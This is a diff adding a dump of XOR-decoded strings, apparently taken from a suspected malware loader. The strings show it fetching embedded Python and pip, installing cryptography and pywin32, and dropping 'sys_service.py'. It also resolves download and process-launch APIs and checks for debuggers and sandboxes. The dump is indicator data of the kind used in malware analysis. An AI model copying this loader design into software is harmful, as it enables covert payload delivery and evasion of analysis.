@@ -1,0 +1,52 @@
+# key 0xD3, installer config
+0x40b020	https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip
+0x40b080	https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-win32.zip
+0x40b0e0	https://bootstrap.pypa.io/get-pip.py
+0x40b108	CRPX0_EMBEDDED
+0x40b11c	OFFLINE
+0x40b130	\py.zip
+0x40b13c	\python
+0x40b148	\sys_service.py
+0x40b15c	\get-pip.py
+0x40b16c	\python.exe
+0x40b17c	\python310._pth
+0x40b1a0	python310.zip
+0x40b1b0	Lib\site-packages
+0x40b1c2	Scripts
+0x40b1e0	"%s" -m pip install --upgrade pip
+0x40b220	"%s" -m pip install cryptography requests pywin32
+# key 0xD3, API resolver table
+0x7abde0	kernel32.dll
+0x7abdf0	wininet.dll
+0x7abe00	shell32.dll
+0x7abe10	ole32.dll
+0x7abe20	oleaut32.dll
+0x7abe30	InternetOpenA
+0x7abe44	InternetOpenUrlA
+0x7abe58	InternetReadFile
+0x7abe6c	InternetCloseHandle
+0x7abe84	ShellExecuteA
+0x7abe98	CoInitialize
+0x7abea8	CoUninitialize
+0x7abebc	CLSIDFromProgID
+0x7abed0	CoCreateInstance
+0x7abee4	VariantInit
+0x7abef4	VariantClear
+0x7abf04	SysAllocString
+0x7abf18	SysFreeString
+0x7abf2c	CreateProcessA
+0x7abf40	IsDebuggerPresent
+0x7abf58	SetEnvironmentVariableA
+0x7abf74	GetSystemInfo
+0x7abf88	GetTickCount64
+0x7abf9c	GlobalMemoryStatusEx
+0x7abfb4	GetDiskFreeSpaceExA
+0x7abfcc	Shell.Application
+0x7abfe4	NameSpace
+0x7abff4	CopyHere
+0x7ac000	Items
+0x7ac00c	open
+0x7ac020	Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+0x7ac050	%USERPROFILE%
+0x7ac084	,,,,,,,,-,,,
+0x7ac094	,,,,
